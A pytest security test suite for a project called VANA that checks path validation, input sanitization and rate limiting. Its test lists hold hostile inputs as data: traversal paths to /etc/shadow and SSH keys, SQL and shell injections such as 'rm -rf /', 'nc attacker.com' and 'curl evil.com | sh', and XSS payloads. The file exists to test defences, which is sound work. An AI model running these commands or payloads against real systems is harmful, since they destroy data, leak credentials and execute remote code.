"""
Comprehensive Security Test Suite for VANA
Tests path validation, input sanitization, rate limiting, and overall security
"""

import os
import tempfile
import threading
import time
from concurrent.futures import ThreadPoolExecutor
from pathlib import Path

import pytest

from lib.security.input_sanitizer import (
    InputSanitizer,
    SanitizationError,
    get_default_sanitizer,
    get_strict_sanitizer,
    sanitize_input,
)

# Import security modules
from lib.security.path_validator import (
    PathSecurityError,
    PathValidator,
    get_default_validator,
    get_strict_validator,
    safe_join_path,
    validate_file_path,
)
from lib.security.rate_limiter import (
    RateLimiter,
    RateLimitExceeded,
    SpecialistRateLimiter,
    check_rate_limit,
    get_global_limiter,
    rate_limit,
)


class TestPathValidation:
    """Test path validation security"""

    def test_basic_path_validation(self):
        """Test basic path validation"""
        validator = PathValidator(allowed_base_paths=[os.getcwd()])

        # Valid paths
        valid_path = validator.validate_path("test.txt")
        assert valid_path.is_absolute()

        # Invalid paths
        with pytest.raises(PathSecurityError):
            validator.validate_path("../../../etc/passwd")

        with pytest.raises(PathSecurityError):
            validator.validate_path("/etc/passwd")

    def test_directory_traversal_prevention(self):
        """Test prevention of directory traversal attacks"""
        validator = get_default_validator()

        # Various traversal attempts
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "test/../../../etc/passwd",
            "./../../sensitive",
            "%2e%2e/etc/passwd",
            "..%2f..%2fetc%2fpasswd",
            "..%c0%af..%c0%afetc%c0%afpasswd",
        ]

        for attempt in traversal_attempts:
            with pytest.raises(PathSecurityError):
                validator.validate_path(attempt)

    def test_symlink_prevention(self):
        """Test symbolic link prevention"""
        validator = PathValidator(allowed_base_paths=[os.getcwd()], allow_symlinks=False)

        with tempfile.TemporaryDirectory() as tmpdir:
            # Create a symlink
            real_file = Path(tmpdir) / "real.txt"
            real_file.write_text("test")

            symlink = Path(tmpdir) / "link.txt"
            symlink.symlink_to(real_file)

            # Should fail with symlinks disabled
            with pytest.raises(PathSecurityError):
                validator.validate_path(str(symlink))

    def test_forbidden_paths(self):
        """Test forbidden system paths"""
        validator = get_default_validator()

        forbidden = [
            "/etc/passwd",
            "/etc/shadow",
            "/proc/self/environ",
            "/sys/class/net",
            "C:\\Windows\\System32\\config",
            "C:\\Windows\\System32\\drivers\\etc\\hosts",
        ]

        for path in forbidden:
            with pytest.raises(PathSecurityError):
                validator.validate_path(path)

    def test_file_extension_validation(self):
        """Test file extension restrictions"""
        validator = PathValidator(allowed_base_paths=[os.getcwd()], allowed_extensions={".txt", ".json", ".py"})

        # Allowed extensions
        validator.validate_path("test.txt")
        validator.validate_path("data.json")

        # Forbidden extensions
        with pytest.raises(PathSecurityError):
            validator.validate_path("malware.exe")

        with pytest.raises(PathSecurityError):
            validator.validate_path("script.sh")

    def test_safe_path_joining(self):
        """Test safe path joining"""
        base = "/safe/base"

        # Safe joins
        result = safe_join_path(base, "subdir", "file.txt")
        assert str(result).startswith(base)

        # Unsafe joins should be sanitized
        result = safe_join_path(base, "../etc", "passwd")
        assert "etc" not in str(result)
        assert ".." not in str(result)


class TestInputSanitization:
    """Test input sanitization security"""

    def test_sql_injection_prevention(self):
        """Test SQL injection prevention"""
        sanitizer = get_default_sanitizer()

        # SQL injection attempts
        sql_injections = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'--",
            "1; DELETE FROM users WHERE 1=1",
            "' UNION SELECT * FROM passwords --",
            "1' AND 1=1 UNION ALL SELECT 1,2,3--",
        ]

        for injection in sql_injections:
            with pytest.raises(SanitizationError):
                sanitizer.sanitize_string(injection, context="sql")

    def test_command_injection_prevention(self):
        """Test command injection prevention"""
        sanitizer = get_default_sanitizer()

        # Command injection attempts
        cmd_injections = [
            "; rm -rf /",
            "test && cat /etc/passwd",
            "| nc attacker.com 1234",
            "`whoami`",
            "$(cat /etc/shadow)",
            "test; curl http://evil.com/steal",
        ]

        for injection in cmd_injections:
            with pytest.raises(SanitizationError):
                sanitizer.sanitize_string(injection, context="shell")

    def test_xss_prevention(self):
        """Test XSS prevention"""
        sanitizer = InputSanitizer(allow_html=False)

        # XSS attempts
        xss_attempts = [
            "<script>alert('XSS')</script>",
            "<img src=x onerror='alert(1)'>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<body onload='steal()'>",
            "javascript:void(0)",
            "<svg onload='malicious()'/>",
        ]

        for xss in xss_attempts:
            result = sanitizer.sanitize_string(xss, context="html")
            assert "<script>" not in result
            assert "onerror" not in result
            assert "javascript:" not in result

    def test_path_traversal_in_input(self):
        """Test path traversal in input sanitization"""
        sanitizer = get_default_sanitizer()

        traversals = ["../../../etc/passwd", "..\\windows\\system32", "~/../../root/.ssh/id_rsa"]

        for traversal in traversals:
            with pytest.raises(SanitizationError):
                sanitizer.sanitize_string(traversal, context="path")

    def test_code_sanitization(self):
        """Test code input sanitization"""
        sanitizer = get_default_sanitizer()

        # Dangerous Python code
        dangerous_code = [
            'exec(\'__import__("os").system("rm -rf /")\')',
            'eval(\'__import__("subprocess").call(["cat", "/etc/passwd"])\')',
            "__import__('os').system('curl evil.com | sh')",
            "compile('import os; os.remove(\"/etc/passwd\")', 'string', 'exec')",
        ]

        for code in dangerous_code:
            with pytest.raises(SanitizationError):
                sanitizer.sanitize_code(code, language="python")

        # Safe code should pass
        safe_code = "def add(a, b):\n    return a + b"
        result = sanitizer.sanitize_code(safe_code, language="python")
        assert result == safe_code

    def test_json_sanitization(self):
        """Test JSON input sanitization"""
        sanitizer = get_default_sanitizer()

        # JSON with potential injections
        json_data = """
        {
            "name": "test",
            "query": "'; DROP TABLE users; --",
            "nested": {
                "command": "; rm -rf /"
            }
        }
        """

        with pytest.raises(SanitizationError):
            sanitizer.sanitize_json(json_data)

    def test_email_validation(self):
        """Test email validation"""
        sanitizer = get_default_sanitizer()

        # Valid emails
        valid_emails = ["user@example.com", "test.user@domain.co.uk", "admin+tag@company.org"]

        for email in valid_emails:
            result = sanitizer.validate_email(email)
            assert result == email.lower()

        # Invalid emails
        invalid_emails = ["not-an-email", "@example.com", "user@", "user@.com", "user@domain", "user space@example.com"]

        for email in invalid_emails:
            with pytest.raises(SanitizationError):
                sanitizer.validate_email(email)


class TestRateLimiting:
    """Test rate limiting security"""

    def test_basic_rate_limiting(self):
        """Test basic rate limiting functionality"""
        limiter = RateLimiter(
            requests_per_minute=10, requests_per_hour=100, burst_size=3, use_redis=False  # Use local for testing
        )

        # Burst requests should succeed
        for i in range(3):
            allowed, retry_after = limiter.check_rate_limit("test_user", "test")
            assert allowed is True

        # Fourth request should fail
        allowed, retry_after = limiter.check_rate_limit("test_user", "test")
        assert allowed is False
        assert retry_after is not None

    def test_rate_limit_decorator(self):
        """Test rate limit decorator"""

        @rate_limit(requests_per_minute=5, burst_size=2)
        def test_function(user_id):
            return f"Hello {user_id}"

        # First two calls should succeed
        assert test_function("user1") == "Hello user1"
        assert test_function("user1") == "Hello user1"

        # Third call should fail
        with pytest.raises(RateLimitExceeded):
            test_function("user1")

        # Different user should work
        assert test_function("user2") == "Hello user2"

    def test_specialist_rate_limiting(self):
        """Test specialist-specific rate limits"""
        # Security specialist has lower limits
        security_limiter = SpecialistRateLimiter("security")
        data_limiter = SpecialistRateLimiter("data_science")

        # Security should have stricter limits
        assert security_limiter.requests_per_minute < data_limiter.requests_per_minute
        assert security_limiter.burst_size < data_limiter.burst_size

    def test_concurrent_rate_limiting(self):
        """Test rate limiting under concurrent access"""
        limiter = RateLimiter(requests_per_minute=20, burst_size=5, use_redis=False)

        success_count = 0
        fail_count = 0

        def make_request():
            nonlocal success_count, fail_count
            allowed, _ = limiter.check_rate_limit("concurrent_user", "test")
            if allowed:
                success_count += 1
            else:
                fail_count += 1

        # Make 10 concurrent requests
        with ThreadPoolExecutor(max_workers=10) as executor:
            futures = [executor.submit(make_request) for _ in range(10)]
            for future in futures:
                future.result()

        # Should allow burst_size requests
        assert success_count == 5
        assert fail_count == 5

    def test_rate_limit_reset(self):
        """Test rate limit reset functionality"""
        limiter = RateLimiter(requests_per_minute=5, burst_size=2, use_redis=False)

        # Exhaust limit
        for _ in range(2):
            limiter.check_rate_limit("reset_user", "test")

        # Should be rate limited
        allowed, _ = limiter.check_rate_limit("reset_user", "test")
        assert allowed is False

        # Reset limits
        limiter.reset_limits("reset_user", "test")

        # Should work again
        allowed, _ = limiter.check_rate_limit("reset_user", "test")
        assert allowed is True

    def test_rate_limit_quota(self):
        """Test remaining quota tracking"""
        limiter = RateLimiter(requests_per_minute=10, requests_per_hour=100, burst_size=5, use_redis=False)

        # Initial quota
        quota = limiter.get_remaining_quota("quota_user", "test")
        assert quota["tokens_available"] == 5
        assert quota["requests_per_minute_remaining"] == 10

        # Make some requests
        for _ in range(3):
            limiter.check_rate_limit("quota_user", "test")

        # Check updated quota
        quota = limiter.get_remaining_quota("quota_user", "test")
        assert quota["tokens_available"] < 5
        assert quota["requests_per_minute_remaining"] == 7


class TestIntegratedSecurity:
    """Test integrated security scenarios"""

    def test_secure_file_operation(self):
        """Test secure file operation with all security layers"""
        # Path validation
        validator = get_default_validator()

        # Input sanitization
        sanitizer = get_default_sanitizer()

        # Rate limiting
        check_rate_limit("test_user", "file_operation")

        # Simulate user input
        user_path = "documents/report.txt"

        # Validate path
        safe_path = validator.validate_path(user_path)

        # Sanitize any content
        content = "User provided content with no <script> tags"
        safe_content = sanitizer.sanitize_string(content, context="general")

        assert safe_path.is_absolute()
        assert "<script>" not in safe_content

    def test_security_bypass_attempts(self):
        """Test various security bypass attempts"""
        validator = get_strict_validator()
        sanitizer = get_strict_sanitizer()

        # Combined attack attempts
        attacks = [
            # Path + SQL injection
            ("../../etc/passwd'; DROP TABLE users; --", "path"),
            # XSS + Command injection
            ("<script>alert(1)</script>; cat /etc/shadow", "general"),
            # Unicode bypass attempts
            ("..%c0%af..%c0%afetc%c0%afpasswd", "path"),
            # Null byte injection
            ("file.txt\x00.exe", "path"),
        ]

        for attack, context in attacks:
            # Should fail at either validation or sanitization
            try:
                if context == "path":
                    validator.validate_path(attack)
                else:
                    sanitizer.sanitize_string(attack, context=context, strict=True)
                # Should not reach here
                assert False, f"Attack not blocked: {attack}"
            except (PathSecurityError, SanitizationError):
                # Expected - attack blocked
                pass

    def test_performance_under_security(self):
        """Test performance impact of security measures"""
        import time

        validator = get_default_validator()
        sanitizer = get_default_sanitizer()
        limiter = get_global_limiter()

        # Measure overhead
        iterations = 1000

        start_time = time.time()
        for i in range(iterations):
            # Simulate secure operation
            path = f"test_{i}.txt"
            content = f"Safe content {i}"

            # Security checks
            validator.validate_path(path)
            sanitizer.sanitize_string(content)
            limiter.check_rate_limit(f"user_{i % 10}", "test")

        elapsed = time.time() - start_time
        per_operation = (elapsed / iterations) * 1000  # Convert to ms

        # Security overhead should be minimal
        assert per_operation < 10  # Less than 10ms per operation
        print(f"Security overhead: {per_operation:.2f}ms per operation")


if __name__ == "__main__":
    pytest.main([__file__, "-v"])
